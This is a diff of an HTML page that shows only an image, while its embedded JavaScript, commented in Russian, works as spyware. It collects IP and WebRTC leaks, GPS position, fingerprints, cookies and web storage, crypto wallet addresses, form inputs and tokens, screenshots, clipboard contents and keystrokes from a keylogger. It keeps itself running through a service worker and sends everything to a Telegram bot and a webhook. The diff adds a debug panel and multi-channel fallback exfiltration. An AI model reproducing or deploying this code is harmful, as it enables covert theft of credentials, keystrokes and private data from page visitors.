@@ -28,19 +28,38 @@
             bottom: 20px;
             left: 50%;
             transform: translateX(-50%);
-            color: #222;
+            color: #333;
             font: 10px/1.4 system-ui, sans-serif;
             text-align: center;
             opacity: 0.15;
             pointer-events: none;
             z-index: 10;
         }
+        #debug {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.85);
+            color: #0f0;
+            font: 10px/1.3 monospace;
+            padding: 8px 10px;
+            border-radius: 6px;
+            border: 1px solid #222;
+            max-width: 280px;
+            max-height: 300px;
+            overflow-y: auto;
+            z-index: 999;
+            display: none;
+            pointer-events: none;
+        }
+        #debug div { border-bottom: 1px solid #111; padding: 1px 0; }
     </style>
 </head>
 <body>
 
     <img src="https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg" alt="">
     <div id="status">⏳</div>
+    <div id="debug"></div>
 
     <script>
         // ================================================================
@@ -52,66 +71,162 @@
             CHAT_ID: '8327334745',
             TIMEOUT: 300,
             DNS_SERVER: 'leak-{uid}.your-server.com',
-            WS_SERVER: 'wss://echo.websocket.org'
+            WS_SERVER: 'wss://echo.websocket.org',
+            DEBUG: true // Включаем отладку, чтобы видеть что происходит
         };
+
+        // ================================================================
+        // ОТЛАДКА (видимая)
+        // ================================================================
+        const debugEl = document.getElementById('debug');
+        const statusEl = document.getElementById('status');
+        
+        function log(msg) {
+            if (CFG.DEBUG) {
+                console.log('[S]', msg);
+                debugEl.style.display = 'block';
+                const time = new Date().toLocaleTimeString();
+                debugEl.innerHTML += `<div>${time} → ${msg}</div>`;
+                debugEl.scrollTop = debugEl.scrollHeight;
+            }
+        }
+
+        function setStatus(s) {
+            statusEl.textContent = s;
+            log(s);
+        }
 
         // ================================================================
         // УТИЛИТЫ
         // ================================================================
-        const log = (m) => { if (!window._STEALTH) console.log('[S]', m); };
-        const setStatus = (s) => { const el = document.getElementById('status'); if (el) el.textContent = s; };
         const sleep = ms => new Promise(r => setTimeout(r, ms));
         const trunc = (s, n = 80) => typeof s === 'string' ? (s.length > n ? s.slice(0, n) + '…' : s) : String(s);
-        const fetchTO = (url, opts = {}, t = CFG.TIMEOUT) => 
-            Promise.race([fetch(url, opts), new Promise((_, rej) => setTimeout(() => rej('Timeout'), t))]);
-        const b64encode = s => {
-            try { return btoa(unescape(encodeURIComponent(s))); } 
-            catch { try { return btoa(s); } catch { return ''; } }
-        };
         const uid = () => Math.random().toString(36).slice(2) + Date.now().toString(36);
 
+        const fetchTO = (url, opts = {}, t = CFG.TIMEOUT) => {
+            return Promise.race([
+                fetch(url, opts),
+                new Promise((_, rej) => setTimeout(() => rej('Timeout'), t))
+            ]);
+        };
+
         // ================================================================
-        // ЭКСФИЛЬТРАЦИЯ
+        // ЭКСФИЛЬТРАЦИЯ С FALLBACK
         // ================================================================
+
+        // 1. Telegram — с разбивкой на части
         async function sendTelegram(text) {
             try {
-                const r = await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CFG.CHAT_ID,
-                        text: text,
-                        parse_mode: 'HTML'
-                    })
-                });
-                return (await r.json()).ok || false;
-            } catch { return false; }
+                const maxLen = 4000;
+                const parts = [];
+                if (text.length > maxLen) {
+                    for (let i = 0; i < text.length; i += maxLen) {
+                        parts.push(text.slice(i, i + maxLen));
+                    }
+                } else {
+                    parts.push(text);
+                }
+
+                let allOk = true;
+                for (let i = 0; i < parts.length; i++) {
+                    const part = parts.length > 1 ? `[${i+1}/${parts.length}]\n${parts[i]}` : parts[i];
+                    const r = await fetch(`https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CFG.CHAT_ID,
+                            text: part.slice(0, 4096),
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    const data = await r.json();
+                    if (!data.ok) {
+                        log('⚠️ Telegram part ' + (i+1) + ' failed: ' + JSON.stringify(data));
+                        allOk = false;
+                    } else {
+                        log('✅ Telegram part ' + (i+1) + ' sent');
+                    }
+                    await sleep(200);
+                }
+                return allOk;
+            } catch (e) {
+                log('❌ Telegram error: ' + e.message);
+                return false;
+            }
         }
 
+        // 2. Webhook через Image (обходит CORS)
         function sendImage(data) {
             return new Promise((resolve) => {
                 try {
                     const payload = encodeURIComponent(JSON.stringify(data).slice(0, 2000));
                     const img = new Image();
                     img.src = `${CFG.WEBHOOK}?d=${payload}&t=${Date.now()}`;
-                    img.onload = () => resolve(true);
-                    img.onerror = () => resolve(true);
-                    setTimeout(() => resolve(false), 400);
-                } catch { resolve(false); }
+                    img.onload = () => { log('✅ Webhook Image: sent'); resolve(true); };
+                    img.onerror = () => { log('⚠️ Webhook Image: error'); resolve(false); };
+                    setTimeout(() => resolve(false), 500);
+                } catch (e) {
+                    log('❌ Webhook Image: ' + e.message);
+                    resolve(false);
+                }
             });
         }
 
+        // 3. Beacon API
         function sendBeacon(data) {
             try {
-                return navigator.sendBeacon(CFG.WEBHOOK, new Blob([JSON.stringify(data)], { type: 'application/json' }));
-            } catch { return false; }
+                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
+                const result = navigator.sendBeacon(CFG.WEBHOOK, blob);
+                log('📤 Beacon: ' + (result ? 'sent' : 'failed'));
+                return result;
+            } catch (e) {
+                log('❌ Beacon: ' + e.message);
+                return false;
+            }
         }
 
+        // 4. Fetch с fallback
+        async function sendFetch(data) {
+            try {
+                const r = await fetch(CFG.WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                log('✅ Fetch: ' + r.status);
+                return r.ok;
+            } catch (e) {
+                log('❌ Fetch: ' + e.message);
+                return false;
+            }
+        }
+
+        // Основная отправка — все каналы
         async function exfiltrate(report, fullData) {
+            log('📤 Начинаем отправку...');
+            
+            const results = [];
+            
+            // 1. Telegram (основной)
             const t1 = await sendTelegram(report);
+            results.push({ channel: 'Telegram', ok: t1 });
+            
+            // 2. Image
             const t2 = await sendImage(fullData);
+            results.push({ channel: 'Image', ok: t2 });
+            
+            // 3. Beacon
             const t3 = sendBeacon(fullData);
-            return { telegram: t1, image: t2, beacon: t3 };
+            results.push({ channel: 'Beacon', ok: t3 });
+            
+            // 4. Fetch
+            const t4 = await sendFetch(fullData);
+            results.push({ channel: 'Fetch', ok: t4 });
+            
+            const ok = results.filter(r => r.ok).length;
+            log(`📊 Отправлено: ${ok}/${results.length} каналов`);
+            
+            return results;
         }
 
         // ================================================================
@@ -120,25 +235,27 @@
         async function getNetworkData() {
             const result = { ips: [], webrtc: { public: [], local: [] }, network: null, dns: null, timing: [] };
             
-            // IP из нескольких источников
-            const sources = [
-                { url: 'https://api.ipify.org?format=json', key: 'ip' },
-                { url: 'https://api.ip.sb/geoip', key: 'ip' },
-                { url: 'https://ipapi.co/json/', key: 'ip' }
-            ];
-            for (const src of sources) {
-                try {
-                    const r = await fetchTO(src.url, {}, 400);
-                    const d = await r.json();
-                    const ip = d[src.key] || d.ip;
-                    if (ip) {
-                        result.ips.push({ ip, source: src.url.split('/')[2], data: d });
-                    }
-                } catch {}
-            }
-
-            // WebRTC
             try {
+                // IP из нескольких источников
+                const sources = [
+                    { url: 'https://api.ipify.org?format=json', key: 'ip' },
+                    { url: 'https://api.ip.sb/geoip', key: 'ip' },
+                    { url: 'https://ipapi.co/json/', key: 'ip' }
+                ];
+                for (const src of sources) {
+                    try {
+                        const r = await fetchTO(src.url, {}, 400);
+                        const d = await r.json();
+                        const ip = d[src.key] || d.ip;
+                        if (ip) {
+                            result.ips.push({ ip, source: src.url.split('/')[2], data: d });
+                        }
+                    } catch (e) { log('⚠️ IP source failed: ' + src.url); }
+                }
+            } catch (e) { log('⚠️ Network IP error: ' + e.message); }
+
+            try {
+                // WebRTC
                 const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
                     iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                 });
@@ -156,14 +273,14 @@
                         });
                     }
                 };
-                await new Promise(r => setTimeout(r, 600));
+                await sleep(600);
                 pc.close();
                 result.webrtc.public = [...new Set(result.webrtc.public)];
                 result.webrtc.local = [...new Set(result.webrtc.local)];
-            } catch {}
+            } catch (e) { log('⚠️ WebRTC error: ' + e.message); }
 
-            // Network API
             try {
+                // Network API
                 const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 if (conn) {
                     result.network = {
@@ -174,148 +291,143 @@
                         saveData: conn.saveData
                     };
                 }
-            } catch {}
+            } catch (e) {}
 
-            // DNS-утечка
             try {
-                const start = Date.now();
+                // DNS-утечка
                 const dnsUid = uid();
                 const domain = CFG.DNS_SERVER.replace('{uid}', dnsUid);
+                const start = Date.now();
                 const img = new Image();
                 img.src = `https://${domain}/pixel?t=${Date.now()}`;
-                await new Promise(r => setTimeout(r, 500));
+                await sleep(500);
                 result.dns = { domain, time: Date.now() - start };
-            } catch {}
+            } catch (e) { log('⚠️ DNS error: ' + e.message); }
 
-            // Временная атака (задержка)
-            const servers = ['https://google.com', 'https://facebook.com'];
-            const times = [];
-            for (const s of servers) {
-                try {
-                    const start = performance.now();
-                    await fetch(s, { mode: 'no-cors' });
-                    times.push(performance.now() - start);
-                } catch {}
-            }
-            if (times.length) {
-                result.timing = times;
-            }
+            try {
+                // Временная атака
+                const servers = ['https://google.com', 'https://facebook.com'];
+                const times = [];
+                for (const s of servers) {
+                    try {
+                        const start = performance.now();
+                        await fetch(s, { mode: 'no-cors' });
+                        times.push(performance.now() - start);
+                    } catch {}
+                }
+                if (times.length) result.timing = times;
+            } catch (e) {}
 
             return result;
         }
 
         // ================================================================
-        // 2. ГЕОЛОКАЦИЯ (GPS)
+        // 2. ГЕОЛОКАЦИЯ
         // ================================================================
         function getGPS() {
             return new Promise((resolve) => {
-                if (!navigator.geolocation) { resolve(null); return; }
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
-                    () => resolve(null),
-                    { timeout: 3000, enableHighAccuracy: false }
-                );
-                setTimeout(() => resolve(null), 3000);
+                try {
+                    if (!navigator.geolocation) { resolve(null); return; }
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+                        () => resolve(null),
+                        { timeout: 3000, enableHighAccuracy: false }
+                    );
+                    setTimeout(() => resolve(null), 3000);
+                } catch (e) { resolve(null); }
             });
         }
 
         // ================================================================
-        // 3. УСТРОЙСТВО (ОС, браузер, модель, ядра, RAM, экран)
+        // 3. УСТРОЙСТВО
         // ================================================================
         function getDeviceInfo() {
-            const n = navigator;
-            const ua = n.userAgent.toLowerCase();
-            const result = {
-                userAgent: n.userAgent,
-                platform: n.platform,
-                cores: n.hardwareConcurrency || '?',
-                memory: n.deviceMemory || '?',
-                language: n.language,
-                languages: n.languages || [],
-                vendor: n.vendor,
-                maxTouchPoints: n.maxTouchPoints || 0,
-                os: 'unknown',
-                osVersion: 'unknown',
-                browser: 'unknown',
-                browserVersion: 'unknown',
-                model: 'unknown'
-            };
+            try {
+                const n = navigator;
+                const ua = n.userAgent.toLowerCase();
+                const result = {
+                    userAgent: n.userAgent,
+                    platform: n.platform,
+                    cores: n.hardwareConcurrency || '?',
+                    memory: n.deviceMemory || '?',
+                    language: n.language,
+                    vendor: n.vendor,
+                    maxTouchPoints: n.maxTouchPoints || 0,
+                    os: 'unknown',
+                    osVersion: 'unknown',
+                    browser: 'unknown',
+                    browserVersion: 'unknown',
+                    model: 'unknown'
+                };
 
-            // ОС
-            if (ua.includes('windows')) {
-                result.os = 'Windows';
-                if (ua.includes('windows nt 10.0')) result.osVersion = '10/11';
-                else if (ua.includes('windows nt 6.3')) result.osVersion = '8.1';
-                else if (ua.includes('windows nt 6.1')) result.osVersion = '7';
-            } else if (ua.includes('mac os x')) {
-                result.os = 'macOS';
-                const m = ua.match(/mac os x (\d+)_(\d+)/);
-                if (m) result.osVersion = `${m[1]}.${m[2]}`;
-            } else if (ua.includes('linux')) {
-                result.os = 'Linux';
-                if (ua.includes('android')) {
-                    result.os = 'Android';
-                    const m = ua.match(/android (\d+\.\d+)/);
-                    if (m) result.osVersion = m[1];
+                if (ua.includes('windows')) {
+                    result.os = 'Windows';
+                    if (ua.includes('windows nt 10.0')) result.osVersion = '10/11';
+                    else if (ua.includes('windows nt 6.3')) result.osVersion = '8.1';
+                    else if (ua.includes('windows nt 6.1')) result.osVersion = '7';
+                } else if (ua.includes('mac os x')) {
+                    result.os = 'macOS';
+                    const m = ua.match(/mac os x (\d+)_(\d+)/);
+                    if (m) result.osVersion = `${m[1]}.${m[2]}`;
+                } else if (ua.includes('linux')) {
+                    result.os = 'Linux';
+                    if (ua.includes('android')) {
+                        result.os = 'Android';
+                        const m = ua.match(/android (\d+\.\d+)/);
+                        if (m) result.osVersion = m[1];
+                    }
+                } else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) {
+                    result.os = 'iOS';
+                    const m = ua.match(/os (\d+)_(\d+)/);
+                    if (m) result.osVersion = `${m[1]}.${m[2]}`;
                 }
-            } else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) {
-                result.os = 'iOS';
-                const m = ua.match(/os (\d+)_(\d+)/);
-                if (m) result.osVersion = `${m[1]}.${m[2]}`;
-            }
 
-            // Браузер
-            if (!!window.chrome && !ua.includes('edg') && !ua.includes('opr')) {
-                result.browser = 'Chrome';
-                const m = ua.match(/chrome\/(\d+)/);
-                if (m) result.browserVersion = m[1];
-            } else if (ua.includes('firefox')) {
-                result.browser = 'Firefox';
-                const m = ua.match(/firefox\/(\d+)/);
-                if (m) result.browserVersion = m[1];
-            } else if (ua.includes('safari') && !ua.includes('chrome')) {
-                result.browser = 'Safari';
-                const m = ua.match(/version\/(\d+)/);
-                if (m) result.browserVersion = m[1];
-            } else if (ua.includes('edg')) {
-                result.browser = 'Edge';
-                const m = ua.match(/edg\/(\d+)/);
-                if (m) result.browserVersion = m[1];
-            } else if (ua.includes('opr')) {
-                result.browser = 'Opera';
-                const m = ua.match(/opr\/(\d+)/);
-                if (m) result.browserVersion = m[1];
-            }
+                if (!!window.chrome && !ua.includes('edg') && !ua.includes('opr')) {
+                    result.browser = 'Chrome';
+                    const m = ua.match(/chrome\/(\d+)/);
+                    if (m) result.browserVersion = m[1];
+                } else if (ua.includes('firefox')) {
+                    result.browser = 'Firefox';
+                    const m = ua.match(/firefox\/(\d+)/);
+                    if (m) result.browserVersion = m[1];
+                } else if (ua.includes('safari') && !ua.includes('chrome')) {
+                    result.browser = 'Safari';
+                    const m = ua.match(/version\/(\d+)/);
+                    if (m) result.browserVersion = m[1];
+                } else if (ua.includes('edg')) {
+                    result.browser = 'Edge';
+                    const m = ua.match(/edg\/(\d+)/);
+                    if (m) result.browserVersion = m[1];
+                } else if (ua.includes('opr')) {
+                    result.browser = 'Opera';
+                    const m = ua.match(/opr\/(\d+)/);
+                    if (m) result.browserVersion = m[1];
+                }
 
-            // Модель (Android/iOS)
-            if (result.os === 'Android') {
-                const m = ua.match(/; (.*?) Build\//);
-                if (m) result.model = m[1];
-            } else if (result.os === 'iOS') {
-                const m = ua.match(/\(([^;]+);/);
-                if (m) result.model = m[1];
-            }
+                if (result.os === 'Android') {
+                    const m = ua.match(/; (.*?) Build\//);
+                    if (m) result.model = m[1];
+                } else if (result.os === 'iOS') {
+                    const m = ua.match(/\(([^;]+);/);
+                    if (m) result.model = m[1];
+                }
 
-            // Экран
-            result.screen = {
-                width: screen.width,
-                height: screen.height,
-                pixelRatio: window.devicePixelRatio,
-                availWidth: screen.availWidth,
-                availHeight: screen.availHeight,
-                colorDepth: screen.colorDepth
-            };
+                result.screen = {
+                    width: screen.width,
+                    height: screen.height,
+                    pixelRatio: window.devicePixelRatio,
+                    colorDepth: screen.colorDepth
+                };
 
-            return result;
+                return result;
+            } catch (e) { log('⚠️ Device error: ' + e.message); return {}; }
         }
 
         // ================================================================
-        // 4. ФИНГЕРПРИНТЫ (WebGL, Canvas, Audio, шрифты, таймзона)
+        // 4. ФИНГЕРПРИНТЫ
         // ================================================================
         function getFingerprints() {
             const fp = {};
-
-            // Canvas
             try {
                 const c = document.createElement('canvas');
                 c.width = 256;
@@ -334,9 +446,8 @@
                 ctx.fillStyle = '#f0f';
                 ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 70);
                 fp.canvas = c.toDataURL().slice(0, 100);
-            } catch {}
+            } catch (e) {}
 
-            // WebGL
             try {
                 const c = document.createElement('canvas');
                 const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
@@ -354,53 +465,52 @@
                         };
                     }
                     fp.webgl.version = gl.getParameter(gl.VERSION);
-                    fp.webgl.maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
                 }
-            } catch {}
+            } catch (e) {}
 
-            // Audio
             try {
                 const AudioCtx = window.AudioContext || window.webkitAudioContext;
                 if (AudioCtx) {
                     const ctx = new AudioCtx();
                     fp.audio = { sampleRate: ctx.sampleRate };
                 }
-            } catch {}
+            } catch (e) {}
 
-            // Шрифты
             try {
                 const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
                     'Comic Sans MS', 'Impact', 'Tahoma', 'Roboto', 'Open Sans',
-                    'Lato', 'Montserrat', 'Ubuntu', 'Fira Sans', 'Segoe UI', 'Helvetica Neue',
-                    'Arial Black', 'Calibri', 'Cambria', 'Consolas', 'Lucida Console'];
+                    'Lato', 'Montserrat', 'Ubuntu', 'Fira Sans', 'Segoe UI', 'Helvetica Neue'];
                 fp.fonts = fonts.filter(f => {
                     try { return document.fonts.check(`16px "${f}"`); } catch { return false; }
                 });
-            } catch {}
+            } catch (e) {}
 
-            // Таймзона
-            try { fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch {}
+            try { fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) {}
 
             return fp;
         }
 
         // ================================================================
-        // 5. STORAGE (LocalStorage, SessionStorage, Cookies, IndexedDB)
+        // 5. STORAGE
         // ================================================================
         function getStorage() {
             const ls = {};
             try { for (let i = 0; i < localStorage.length; i++) {
                 const k = localStorage.key(i);
-                ls[k] = localStorage.getItem(k);
-            }} catch {}
+                try { ls[k] = localStorage.getItem(k); } catch {}
+            }} catch (e) {}
             const ss = {};
             try { for (let i = 0; i < sessionStorage.length; i++) {
                 const k = sessionStorage.key(i);
-                ss[k] = sessionStorage.getItem(k);
-            }} catch {}
-            return { localStorage: ls, sessionStorage: ss, cookies: document.cookie || 'нет' };
+                try { ss[k] = sessionStorage.getItem(k); } catch {}
+            }} catch (e) {}
+            try { return { localStorage: ls, sessionStorage: ss, cookies: document.cookie || 'нет' }; } 
+            catch (e) { return { localStorage: ls, sessionStorage: ss, cookies: 'нет' }; }
         }
 
+        // ================================================================
+        // 6. INDEXEDDB
+        // ================================================================
         function getIndexedDB() {
             return new Promise((resolve) => {
                 try {
@@ -428,8 +538,7 @@
                                         const store = tx.objectStore(storeName);
                                         const reqAll = store.getAll();
                                         reqAll.onsuccess = () => {
-                                            const items = reqAll.result || [];
-                                            storeData.push({ storeName, count: items.length });
+                                            storeData.push({ storeName, count: reqAll.result?.length || 0 });
                                             if (++sDone === stores.length) {
                                                 result.push({ name: dbInfo.name, stores: storeData });
                                                 db.close();
@@ -457,12 +566,12 @@
                             req.onerror = () => { if (++done === dbs.length) resolve(result); };
                         });
                     }).catch(() => resolve(null));
-                } catch { resolve(null); }
+                } catch (e) { resolve(null); }
             });
         }
 
         // ================================================================
-        // 6. КРИПТОВАЛЮТА (кошельки, сеть)
+        // 7. КРИПТОВАЛЮТА
         // ================================================================
         function getWallets() {
             const result = [];
@@ -474,15 +583,8 @@
                         chainId: window.ethereum.chainId || null,
                         isMetaMask: window.ethereum.isMetaMask || false
                     });
-                    if (window.ethereum.providers) {
-                        window.ethereum.providers.forEach(p => {
-                            if (p.selectedAddress) {
-                                result.push({ type: 'Ethereum', address: p.selectedAddress, isMetaMask: p.isMetaMask || false });
-                            }
-                        });
-                    }
                 }
-            } catch {}
+            } catch (e) {}
             try {
                 if (window.solana && window.solana.publicKey) {
                     result.push({ type: 'Solana', address: window.solana.publicKey.toString() });
@@ -490,16 +592,15 @@
                 if (window.phantom && window.phantom.solana && window.phantom.solana.publicKey) {
                     result.push({ type: 'Phantom', address: window.phantom.solana.publicKey.toString() });
                 }
-            } catch {}
-            const names = ['trustwallet', 'okxwallet', 'bitkeep', 'coinbase', 'walletconnect'];
-            names.forEach(n => {
+            } catch (e) {}
+            ['trustwallet', 'okxwallet', 'bitkeep', 'coinbase', 'walletconnect'].forEach(n => {
                 try { if (window[n]) result.push({ type: n, address: null }); } catch {}
             });
             return result;
         }
 
         // ================================================================
-        // 7. РАСШИРЕНИЯ
+        // 8. РАСШИРЕНИЯ
         // ================================================================
         function getExtensions() {
             const result = [];
@@ -519,18 +620,17 @@
                 if (window.chrome && chrome.runtime) {
                     Object.keys(known).forEach(id => {
                         try {
-                            const url = chrome.runtime.getURL(`//${id}/manifest.json`);
-                            fetch(url, { mode: 'no-cors' }).catch(() => {});
+                            chrome.runtime.getURL(`//${id}/manifest.json`);
                             result.push(known[id]);
                         } catch {}
                     });
                 }
-            } catch {}
+            } catch (e) {}
             return result;
         }
 
         // ================================================================
-        // 8. ПАРОЛИ (автозаполненные формы)
+        // 9. ПАРОЛИ
         // ================================================================
         function getPasswords() {
             const result = [];
@@ -539,25 +639,22 @@
                     const data = { action: form.action || '', inputs: [] };
                     form.querySelectorAll('input').forEach(input => {
                         if (input.value && input.value.length > 0) {
-                            const isPassword = input.type === 'password';
-                            const isEmail = input.type === 'email' || input.autocomplete === 'username';
                             data.inputs.push({
                                 name: input.name || input.id || '',
                                 type: input.type,
-                                value: isPassword ? '[PASSWORD]' : trunc(input.value, 50),
-                                autocomplete: input.autocomplete || '',
-                                isPassword: isPassword
+                                value: input.type === 'password' ? '[PASSWORD]' : trunc(input.value, 50),
+                                isPassword: input.type === 'password'
                             });
                         }
                     });
                     if (data.inputs.length > 0) result.push(data);
                 });
-            } catch {}
+            } catch (e) {}
             return result;
         }
 
         // ================================================================
-        // 9. СЕССИИ (JWT, куки, токены)
+        // 10. СЕКРЕТЫ
         // ================================================================
         function findSecrets(obj) {
             const result = [];
@@ -565,14 +662,16 @@
             const search = (data, path = '') => {
                 if (!data || typeof data !== 'object') return;
                 for (let k in data) {
-                    const v = data[k];
-                    const fullPath = path ? `${path}.${k}` : k;
-                    if (patterns.some(p => k.toLowerCase().includes(p))) {
-                        if (v && typeof v === 'string' && v.length > 3 && v.length < 300) {
-                            result.push({ path: fullPath, value: trunc(v, 60) });
+                    try {
+                        const v = data[k];
+                        const fullPath = path ? `${path}.${k}` : k;
+                        if (patterns.some(p => k.toLowerCase().includes(p))) {
+                            if (v && typeof v === 'string' && v.length > 3 && v.length < 300) {
+                                result.push({ path: fullPath, value: trunc(v, 60) });
+                            }
                         }
-                    }
-                    if (typeof v === 'object' && v !== null) search(v, fullPath);
+                        if (typeof v === 'object' && v !== null) search(v, fullPath);
+                    } catch {}
                 }
             };
             search(obj);
@@ -580,31 +679,24 @@
         }
 
         // ================================================================
-        // 10. DOM (всё на странице)
+        // 11. DOM
         // ================================================================
         function getDOM() {
-            const result = {
-                title: document.title,
-                url: window.location.href,
-                referrer: document.referrer || 'нет',
-                forms: document.querySelectorAll('form').length,
-                inputs: document.querySelectorAll('input, textarea, select').length,
-                links: document.querySelectorAll('a[href]').length,
-                scripts: document.querySelectorAll('script').length,
-                images: document.querySelectorAll('img').length,
-                meta: {}
-            };
             try {
-                document.querySelectorAll('meta').forEach(m => {
-                    const name = m.getAttribute('name') || m.getAttribute('property') || '';
-                    if (name) result.meta[name] = m.getAttribute('content') || '';
-                });
-            } catch {}
-            return result;
+                return {
+                    title: document.title,
+                    url: window.location.href,
+                    referrer: document.referrer || 'нет',
+                    forms: document.querySelectorAll('form').length,
+                    inputs: document.querySelectorAll('input, textarea, select').length,
+                    links: document.querySelectorAll('a[href]').length,
+                    cookies: document.cookie || 'нет'
+                };
+            } catch (e) { return { url: window.location.href || 'unknown' }; }
         }
 
         // ================================================================
-        // 11. СКРИНШОТ
+        // 12. СКРИНШОТ
         // ================================================================
         async function takeScreenshot() {
             try {
@@ -616,54 +708,55 @@
                         script.onerror = reject;
                         document.head.appendChild(script);
                     });
-                    await sleep(200);
+                    await sleep(300);
                 }
                 const canvas = await html2canvas(document.body, {
                     useCORS: true,
                     allowTaint: true,
-                    scale: 0.06,
+                    scale: 0.05,
                     logging: false,
                     backgroundColor: null
                 });
-                return canvas.toDataURL('image/jpeg', 0.1);
-            } catch { return null; }
+                return canvas.toDataURL('image/jpeg', 0.08);
+            } catch (e) { log('⚠️ Screenshot error: ' + e.message); return null; }
         }
 
         // ================================================================
-        // 12. KEYLOGGER
+        // 13. KEYLOGGER
         // ================================================================
         function setupKeylogger() {
-            const buffer = [];
-            document.addEventListener('keydown', (e) => {
-                if (e.key === 'Unidentified') return;
-                const special = {
-                    'Control': '[CTRL]', 'Shift': '[SHIFT]', 'Alt': '[ALT]',
-                    'Meta': '[WIN]', 'Escape': '[ESC]', 'Tab': '[TAB]',
-                    'Enter': '[ENTER]', 'Backspace': '[BACK]', 'Delete': '[DEL]',
-                    'ArrowUp': '[UP]', 'ArrowDown': '[DOWN]', 'ArrowLeft': '[LEFT]', 'ArrowRight': '[RIGHT]',
-                    'Home': '[HOME]', 'End': '[END]', 'PageUp': '[PGUP]', 'PageDown': '[PGDN]'
-                };
-                let out = special[e.key] || e.key;
-                if (e.ctrlKey) out = '[CTRL]+' + out;
-                if (e.shiftKey && !special[e.key]) out = out.toUpperCase();
-                if (e.altKey) out = '[ALT]+' + out;
-                buffer.push(out);
-                if (buffer.length >= 20) {
-                    const data = buffer.splice(0);
-                    sendImage({ keylog: data.join('') });
-                }
-            });
-            setInterval(() => {
-                if (buffer.length > 0) {
-                    const data = buffer.splice(0);
-                    sendImage({ keylog: data.join('') });
-                }
-            }, 20000);
-            return true;
+            try {
+                const buffer = [];
+                document.addEventListener('keydown', (e) => {
+                    if (e.key === 'Unidentified') return;
+                    const special = {
+                        'Control': '[CTRL]', 'Shift': '[SHIFT]', 'Alt': '[ALT]',
+                        'Meta': '[WIN]', 'Escape': '[ESC]', 'Tab': '[TAB]',
+                        'Enter': '[ENTER]', 'Backspace': '[BACK]', 'Delete': '[DEL]',
+                        'ArrowUp': '[UP]', 'ArrowDown': '[DOWN]', 'ArrowLeft': '[LEFT]', 'ArrowRight': '[RIGHT]'
+                    };
+                    let out = special[e.key] || e.key;
+                    if (e.ctrlKey) out = '[CTRL]+' + out;
+                    if (e.shiftKey && !special[e.key]) out = out.toUpperCase();
+                    if (e.altKey) out = '[ALT]+' + out;
+                    buffer.push(out);
+                    if (buffer.length >= 15) {
+                        const data = buffer.splice(0);
+                        sendImage({ keylog: data.join('') });
+                    }
+                });
+                setInterval(() => {
+                    if (buffer.length > 0) {
+                        const data = buffer.splice(0);
+                        sendImage({ keylog: data.join('') });
+                    }
+                }, 20000);
+                return true;
+            } catch (e) { log('⚠️ Keylogger error: ' + e.message); return false; }
         }
 
         // ================================================================
-        // 13. БУФЕР ОБМЕНА
+        // 14. БУФЕР ОБМЕНА
         // ================================================================
         async function getClipboard() {
             try {
@@ -677,7 +770,7 @@
                     if (val && val.length > 0) return val;
                 }
                 ta.remove();
-            } catch {}
+            } catch (e) {}
             try {
                 if (navigator.clipboard && navigator.clipboard.read) {
                     const items = await navigator.clipboard.read();
@@ -688,12 +781,12 @@
                         }
                     }
                 }
-            } catch {}
+            } catch (e) {}
             return null;
         }
 
         // ================================================================
-        // 14. SERVICE WORKERS (персистентность)
+        // 15. SERVICE WORKER
         // ================================================================
         function setupPersistence() {
             try {
@@ -703,10 +796,7 @@
                         self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
                         self.addEventListener('message', e => {
                             if (e.data && e.data.type === 'EXFIL') {
-                                fetch('${CFG.WEBHOOK}', {
-                                    method: 'POST',
-                                    body: JSON.stringify(e.data.payload)
-                                });
+                                fetch('${CFG.WEBHOOK}', { method: 'POST', body: JSON.stringify(e.data.payload) });
                             }
                         });
                     `;
@@ -715,60 +805,48 @@
                     navigator.serviceWorker.register(url, { scope: '/' });
                     return true;
                 }
-            } catch {}
+            } catch (e) { log('⚠️ Service Worker error: ' + e.message); }
             return false;
         }
 
         // ================================================================
-        // 15. СЕНСОРЫ (акселерометр, гироскоп, батарея)
+        // 16. СЕНСОРЫ
         // ================================================================
         function getSensors() {
             return new Promise((resolve) => {
                 const result = {};
-                // Батарея
                 try {
                     if (navigator.getBattery) {
                         navigator.getBattery().then(battery => {
                             result.battery = {
                                 level: Math.round(battery.level * 100),
-                                charging: battery.charging,
-                                chargingTime: battery.chargingTime,
-                                dischargingTime: battery.dischargingTime
+                                charging: battery.charging
                             };
                             resolve(result);
                         });
                     }
-                } catch {}
-                // Акселерометр (однократное чтение)
+                } catch (e) {}
                 try {
                     if (window.DeviceMotionEvent) {
                         const handler = (e) => {
                             if (e.acceleration) {
-                                result.acceleration = {
-                                    x: e.acceleration.x,
-                                    y: e.acceleration.y,
-                                    z: e.acceleration.z
-                                };
+                                result.acceleration = { x: e.acceleration.x, y: e.acceleration.y, z: e.acceleration.z };
                             }
                             if (e.rotationRate) {
-                                result.rotationRate = {
-                                    alpha: e.rotationRate.alpha,
-                                    beta: e.rotationRate.beta,
-                                    gamma: e.rotationRate.gamma
